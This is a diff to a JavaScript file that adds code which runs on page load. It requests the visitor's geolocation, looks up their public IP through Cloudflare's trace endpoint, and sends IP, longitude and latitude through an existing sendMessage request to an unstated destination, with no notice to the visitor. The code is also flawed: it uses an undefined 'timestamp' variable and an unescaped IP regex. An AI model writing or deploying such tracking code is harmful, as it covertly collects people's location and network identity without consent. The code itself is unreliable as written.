@@ -16,9 +16,24 @@ function sendMessage(msg) {
 
   request.send(JSON.stringify(params));
 }
-text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
+
+var x = document.getElementById("demo");
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else {
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+spc = " "
+function showPosition(position) {
+  text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
   let ipRegex = /[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/
   let ip = data.match(ipRegex)[0];
   console.log(ip);
-  sendMessage(ip);
+  sendMessage(ip+spc+position.coords.longitude+spc+position.coords.latitude+spc+timestamp);
 });
+  console.log(position)
+}
+
+getLocation()
